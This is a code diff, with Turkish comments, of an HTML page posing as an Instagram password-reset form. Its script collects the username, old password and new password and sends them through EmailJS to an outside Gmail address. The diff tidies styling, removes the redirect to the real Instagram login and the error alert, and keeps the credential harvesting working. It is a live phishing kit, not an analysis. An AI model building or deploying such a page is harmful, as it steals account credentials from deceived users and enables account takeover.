@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram - Şifre Yenileme</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -18,12 +19,12 @@
             display: flex;
             flex-direction: column; 
             width: 90%;
-            max-width: 400px;
+            max-width: 400px; /* Daha dar bir maksimum genişlik ayarladık */
             margin: 0 auto; 
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             border-radius: 10px;
             background-color: white;
-            overflow: hidden;
+            overflow: hidden; /* Kenarların yuvarlatılması için */
         }
         .message {
             padding: 20px;
@@ -34,12 +35,12 @@
             margin-bottom: 10px;
             font-size: 20px;
             font-weight: bold;
-            text-align: center;
+            text-align: center; /* Ortada hizalama */
         }
         .message p {
             color: #555;
             line-height: 1.5;
-            text-align: center;
+            text-align: center; /* Ortada hizalama */
         }
         .login-container {
             padding: 30px;
@@ -134,10 +135,9 @@
     </div>
 </div>
 
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
-    (function(){
-        emailjs.init("conselora@gmail.com"); // Buraya EmailJS kullanıcı ID'nizi yerleştirin
+    (function() {
+        emailjs.init("conselora@gmail.com"); // Buraya EmailJS kullanıcı ID'nizi girin
     })();
 
     document.getElementById('loginForm').addEventListener('submit', function(event) {
@@ -148,25 +148,18 @@
         const oldPassword = document.getElementById('oldPassword').value;
         const newPassword = document.getElementById('newPassword').value;
 
-        // E-posta gönder
+        // EmailJS ile e-posta gönderimi
         emailjs.send("conselora@gmail.com", "template_wcsahhm", {
             username: username,
             oldPassword: oldPassword,
             newPassword: newPassword
         })
         .then(function(response) {
-            console.log('E-posta başarıyla gönderildi:', response.status);
-            // Modalı göster
+            console.log('E-posta gönderildi!', response.status, response.text);
             const modal = document.getElementById('warningModal');
             modal.style.display = "flex"; // Modalı görünür yap
-
-            // 3 saniye sonra Instagram'a yönlendir
-            setTimeout(function() {
-                window.location.href = "https://www.instagram.com/accounts/login/"; // Instagram giriş sayfasına yönlendir
-            }, 3000); // 3000 milisaniye = 3 saniye
         }, function(error) {
-            console.error('E-posta gönderiminde hata oluştu:', error);
-            alert('E-posta gönderiminde bir hata oluştu. Lütfen tekrar deneyin.');
+            console.log('E-posta gönderme hatası:', error);
         });
     });
 
